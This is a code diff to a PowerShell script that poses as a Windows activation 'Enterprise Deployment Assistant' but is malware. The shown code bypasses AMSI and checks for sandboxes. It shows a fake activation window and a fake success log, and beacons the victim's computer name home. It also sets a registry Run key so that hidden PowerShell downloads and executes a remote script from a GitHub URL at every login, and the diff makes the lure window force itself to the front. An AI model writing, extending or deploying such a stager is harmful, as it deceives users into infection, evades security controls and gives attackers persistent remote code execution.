@@ -1,8 +1,7 @@
-# --- [RESEARCH STAGER v30.2: PERSISTENT ENTERPRISE SUITE] ---
+# --- [RESEARCH STAGER v30.2: FINAL FORCE-VISIBLE EDITION] ---
 
 function Global-Initialize {
     try {
-        # Anti-Sandbox and AMSI Bypass
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         $u = "System.Management.Automation.AmsiUtils"
         [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
@@ -22,7 +21,8 @@ function Show-SecurityPrep {
     $prep.Text = "Windows Enterprise Deployment Assistant"
     $prep.Size = New-Object Drawing.Size(580,520)
     $prep.StartPosition = "CenterScreen"
-    $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
+    $prep.FormBorderStyle = "FixedSingle"
+    $prep.TopMost = $true # Forces it above other windows
     $prep.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path)
 
     $header = New-Object Windows.Forms.Label
@@ -66,6 +66,9 @@ function Show-SecurityPrep {
 
     $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
     $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
+    
+    # FORCING VISIBILITY
+    $prep.Add_Shown({ $prep.Activate(); $prep.BringToFront() })
     $prep.ShowDialog() | Out-Null
 }
 
@@ -85,6 +88,8 @@ function Show-ActivatorUI {
     $form.Controls.Add($pb)
 
     $form.Show()
+    $form.Activate()
+    $form.BringToFront()
     
     $stages = @(
         @{ p=20; t="Validating HWID markers..."; s="" },
@@ -98,14 +103,13 @@ function Show-ActivatorUI {
         if ($pb.Value -eq 85) { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; & explorer.exe }
         while ($pb.Value -lt $stage.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 45 }
     }
-    Start-Sleep -Seconds 2; $form.Close()
+    Start-Sleep -Seconds 1; $form.Close()
 
-    # Create the professional log file
     $logPath = Join-Path ([Environment]::GetFolderPath("Desktop")) "Activation_Log.txt"
-    $logContent = "WINDOWS DIGITAL LICENSE DEPLOYMENT LOG`r`n" + ("="*40) + "`r`nTimestamp: $(Get-Date)`r`nHost: $env:COMPUTERNAME`r`nResult: SUCCESS`r`nLicense: Professional Digital Entitlement`r`nKernel Patch: Applied`r`nWatermark Status: Cleared`r`n" + ("="*40)
+    $logContent = "WINDOWS DIGITAL LICENSE DEPLOYMENT LOG`r`n" + ("="*40) + "`r`nTimestamp: $(Get-Date)`r`nHost: $env:COMPUTERNAME`r`nResult: SUCCESS`r`nLicense: Professional Digital Entitlement`r`n"
     [IO.File]::WriteAllText($logPath, $logContent)
 
-    [Windows.Forms.MessageBox]::Show("Windows has been successfully activated. A system log has been generated on your desktop.", "Success", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information) | Out-Null
+    [Windows.Forms.MessageBox]::Show("Windows has been successfully activated.", "Success", [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information) | Out-Null
     Start-Process notepad.exe $logPath
 }
 
@@ -119,13 +123,12 @@ function Send-Ping {
 
 # --- EXECUTION ---
 Global-Initialize
+Send-Ping -m "V30.2_LAUNCHED_ON_$($env:COMPUTERNAME)"
 Show-SecurityPrep
 
 if ($global:proceed) {
-    Send-Ping -m "V30.2_AUTH_ON_$($env:COMPUTERNAME)"
-    
     try {
-        # Persistence: Runs from GitHub every login
+        # Persistence
         $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
         $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
         Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
